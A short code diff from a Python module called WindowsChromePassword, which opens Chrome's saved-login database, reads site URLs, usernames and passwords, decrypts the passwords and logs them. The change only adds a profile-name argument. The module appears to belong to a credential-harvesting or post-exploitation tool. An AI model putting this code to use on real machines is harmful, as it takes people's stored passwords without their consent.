@@ -29,6 +29,6 @@ class WindowsChromePassword(ChromeModule):
 			if os.path.isfile(password_path):
 				connection = sqlite3.connect(password_path)
 				cursor = connection.cursor()
-				self.cursor_get_and_log(cursor, 'action_url, username_value, password_value', 'logins', decrypt_ids=[2])
+				self.cursor_get_and_log(cursor, 'action_url, username_value, password_value', 'logins', decrypt_ids=[2], spe=os.path.split(profile)[1])
 
 		return True
